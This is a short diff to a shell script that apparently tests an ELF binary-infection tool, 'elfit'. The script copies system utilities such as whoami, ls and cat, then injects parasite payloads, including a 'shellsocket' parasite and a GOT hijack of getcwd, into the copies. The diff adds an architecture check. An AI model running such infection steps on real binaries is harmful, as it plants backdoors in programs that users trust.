@@ -14,8 +14,14 @@ mkdir clean infected
 cp /bin/cat /bin/date /bin/ls /bin/pwd /usr/bin/whoami clean 
 cp clean/* infected
 
-./elfit --parasite parasites/evil64 --reverse --entrypoint infected/whoami >> infected/whoami_output
-./elfit --parasite parasites/evil64 --text --entrypoint infected/date >> infected/date_output
+if [ `arch` == 'x86_64' ]; then
+  ./elfit --parasite parasites/evil64 --reverse --entrypoint infected/whoami >> infected/whoami_output
+  ./elfit --parasite parasites/evil64 --text --entrypoint infected/date >> infected/date_output
+else
+  ./elfit --parasite parasites/evil --reverse --entrypoint infected/whoami >> infected/whoami_output
+  ./elfit --parasite parasites/evil --text --entrypoint infected/date >> infected/date_output
+fi
+
 ./elfit --parasite parasites/shellsocket --text --start-main init infected/ls >> infected/ls_output 
 ./elfit --parasite parasites/shellsocket --text --entrypoint infected/cat >> infected/cat_output
 ./elfit --parasite parasites/sleeper --text --got getcwd infected/pwd >> infected/pwd_output
